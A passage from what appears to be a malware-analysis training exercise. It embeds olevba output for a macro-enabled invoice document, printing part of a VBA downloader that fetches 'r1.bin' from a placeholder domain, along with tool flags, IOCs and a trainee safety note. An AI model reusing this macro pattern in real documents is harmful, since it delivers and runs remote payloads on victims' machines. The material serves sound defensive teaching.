...
`.trim(),
    artifacts: [
      ...
      },
      {
        ...
        bytes: utf8(
          [
            "$ olevba --reveal --decode --no-deobf vendor_invoice_january.docm",
            "olevba 0.60.2 - http://decalage.info/python/oletools",
            "Flags        Filename                                                         ",
            "-----------  -----------------------------------------------------------------",
            "OpX:MASIH-B-  vendor_invoice_january.docm",
            "",
            "===============================================================================",
            "FILE: vendor_invoice_january.docm",
            "Type: OpenXML",
            "-------------------------------------------------------------------------------",
            ...
            "    Dim url As String",
            "    Dim local As String",
            "    url = \"https://content-delivery-edge.example/upd/r1.bin\"",
            "    local = Environ(\"TEMP\") & \"\\r1.bin\"",
            "",
            "    Dim http As Object",
            ...
            "|          |                         |command (without showing a window)          |",
            "|Suspicious|CreateObject             |May create OLE objects                      |",
            "|Suspicious|WinHttpRequest           |May download files from the Internet        |",
            "|Suspicious|ADODB.Stream             |May create a binary file on disk            |",
            "|Suspicious|SaveToFile               |May write to a file (in association with    |",
            "|          |                         |ADODB.Stream)                               |",
            "|Suspicious|On Error Resume Next     |May silently ignore runtime errors          |",
            "|IOC       |https://content-delivery |URL (https)                                 |",
            "|          |-edge.example/upd/r1.bin |                                            |",
            "|IOC       |r1.bin                   |Executable file name                        |",
            "+----------+-------------------------+--------------------------------------------+",
            "",
            "",
            "# Safety note for the trainee:",
            "#   The code above is the macro that olevba extracted from the",
            "#   embedded VBA stream of vendor_invoice_january.docm. It is",
            "#   shown here for analysis only. DO NOT paste it into a Word",
            "#   document, an .vbs file, or any other interpreter — the chain",
            "#   above is designed to download and silently run a remote",
            "#   payload from a controlled-domain placeholder.",
            "",
          ].join("\n"),
        ),
      },
